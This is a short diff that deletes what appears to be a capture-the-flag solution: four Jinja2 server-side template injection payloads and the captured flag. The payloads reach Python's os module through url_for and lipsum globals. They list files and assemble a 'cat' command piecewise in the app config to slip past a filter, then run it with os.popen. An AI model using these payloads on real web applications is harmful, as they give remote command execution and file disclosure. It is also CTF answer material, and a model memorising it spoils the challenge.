@@ -1,5 +1,0 @@
-{{url_for.__globals__.os.__dict__.listdir('.')}}
-{{config.update(x='cat truly_an_arbitrarily_')}}
-{{config.update(y=config.x~'named_file')}}
-{{lipsum.__globals__.os.popen(config.y).read()}}
-ictf{F!1+3r5s!?}
